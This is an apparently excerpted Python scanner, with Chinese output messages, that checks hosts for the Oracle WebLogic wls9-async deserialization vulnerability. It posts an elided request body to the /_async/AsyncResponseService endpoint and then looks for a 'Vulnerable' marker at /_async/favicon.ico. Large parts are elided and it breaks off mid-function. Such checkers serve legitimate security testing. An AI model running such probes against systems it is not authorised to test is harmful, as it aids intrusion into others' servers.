...
def check_0(ip, port):
    ...
    try:
        ...
        resp = req.post(url=req_url, headers=headers, data=req_data0, timeout=5)
...
def check_1(ip, port):
    req_data1 = '''
        ...
        '''
    req0_url = f"http://{ip}:{port}/_async/AsyncResponseService"
    req1_url = f"http://{ip}:{port}/_async/favicon.ico"
    try:
        req = requests.Session()
        resp0 = req.post(url=req0_url, headers=headers, data=req_data1, timeout=5)
        req = requests.Session()
        resp1 = req.get(url=req1_url, headers=headers)
        if resp0.status_code == 202 and ('Vulnerable' in resp1.text):
            return True
    except Exception:
        return False
    return False
...
def start(ip, port):
    if check_0(ip, port) or check_1(ip, port):
        print(f"[*] {ip}:{port} 存在Oracle WebLogic Server wls9-async 组件反序列化漏洞,CVE编号[{index}]")
    else:
